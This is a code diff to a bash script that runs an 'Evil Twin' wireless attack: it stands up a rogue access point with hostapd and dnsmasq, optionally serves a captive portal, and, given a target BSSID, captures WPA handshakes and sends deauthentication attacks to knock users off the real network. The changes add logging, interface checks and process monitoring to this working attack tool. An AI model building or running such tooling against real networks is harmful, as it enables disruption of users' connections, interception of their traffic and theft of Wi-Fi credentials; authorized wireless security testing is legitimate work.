@@ -33,7 +33,8 @@ Options:
     -h, --help                 Show this help message
 
 Example:
-    sudo $0 --ssid "Test Network" --channel 6 --target-bssid 00:11:22:33:44:55 --target-channel 6
+    sudo $0 --ssid "Test Network" --channel 6 --ap-iface wlan1mon --deauth-iface wlan0mon --portal-dir ./sites/Example.portal
+    sudo $0 --ssid "Target Network" --channel 6 --target-bssid 00:11:22:33:44:55 --target-channel 6
 EOF
 }
 
@@ -58,11 +59,20 @@ PORTAL_DIR="${PORTAL_DIR/#\~/$HOME}"
 # Check prerequisites
 check_root
 check_dependencies
-validate_directory "$PORTAL_DIR"
+
+# Validate portal directory if specified
+if [[ -n "$PORTAL_DIR" ]]; then
+    validate_directory "$PORTAL_DIR"
+fi
 
 # Validate interfaces
 validate_interface "$AP_IFACE"
 validate_interface "$DEAUTH_IFACE"
+
+# Make sure the two interfaces are different
+if [[ "$AP_IFACE" == "$DEAUTH_IFACE" ]]; then
+    error_exit "AP interface and deauth interface must be different"
+fi
 
 # If target BSSID is provided, target channel is required
 if [[ -n "$TARGET_BSSID" && -z "$TARGET_CHANNEL" ]]; then
@@ -82,6 +92,7 @@ log "Working directory: $WORKDIR"
 setup_trap
 
 # Set up AP interface
+log "Setting up AP interface: $AP_IFACE"
 setup_interface "$AP_IFACE" "$AP_IP/24"
 
 # Create configuration files
@@ -97,24 +108,34 @@ create_hostapd_conf "$HOSTAPD_CONF" "$AP_IFACE" "$SSID" "$CHANNEL"
 create_dnsmasq_conf "$DNSMASQ_CONF" "$AP_IP" "$AP_DHCP_START" "$AP_DHCP_END" "$AP_DHCP_LEASE"
 
 # Start services
+log "Starting AP services..."
 start_hostapd "$HOSTAPD_CONF" "$WORKDIR/hostapd.pid"
 start_dnsmasq "$DNSMASQ_CONF" "$AP_IFACE" "$WORKDIR/dnsmasq.pid"
-start_http_server "$PORTAL_DIR" "$AP_IP" "$HTTP_LOG" "$WORKDIR/http.pid"
+
+# Start HTTP server only if portal directory is specified
+if [[ -n "$PORTAL_DIR" ]]; then
+    start_http_server "$PORTAL_DIR" "$AP_IP" "$HTTP_LOG" "$WORKDIR/http.pid"
+fi
 
 # Start handshake capture if target is specified
 if [[ -n "$TARGET_BSSID" && -n "$TARGET_CHANNEL" ]]; then
+    log "Starting handshake capture and deauth attacks..."
     start_handshake_capture "$DEAUTH_IFACE" "$TARGET_BSSID" "$TARGET_CHANNEL" "$HANDSHAKE_FILE" "$WORKDIR/airodump.pid"
     start_deauth "$DEAUTH_IFACE" "$TARGET_BSSID" "$TARGET_CHANNEL"
 fi
 
 # Display information
+log "=========================================="
 log "Evil Twin attack is running"
 log "SSID: $SSID"
 log "Channel: $CHANNEL"
 log "AP Interface: $AP_IFACE"
 log "Deauth Interface: $DEAUTH_IFACE"
 log "AP IP: $AP_IP"
-log "Portal Directory: $PORTAL_DIR"
+
+if [[ -n "$PORTAL_DIR" ]]; then
+    log "Portal Directory: $PORTAL_DIR"
+fi
 
 if [[ -n "$TARGET_BSSID" ]]; then
     log "Target BSSID: $TARGET_BSSID"
@@ -122,9 +143,17 @@ if [[ -n "$TARGET_BSSID" ]]; then
     log "Handshake file: $HANDSHAKE_FILE-01.cap"
 fi
 
+log "=========================================="
 log "Press Ctrl+C to stop and clean up"
 
 # Wait indefinitely
 while true; do
-    sleep 60
+    # Check if critical processes are still running
+    if [[ -f "$WORKDIR/hostapd.pid" ]] && ! kill -0 "$(cat "$WORKDIR/hostapd.pid")" 2>/dev/null; then
+        error_exit "hostapd process has died"
+    fi
+    if [[ -f "$WORKDIR/dnsmasq.pid" ]] && ! kill -0 "$(cat "$WORKDIR/dnsmasq.pid")" 2>/dev/null; then
+        error_exit "dnsmasq process has died"
+    fi
+    sleep 10
 done
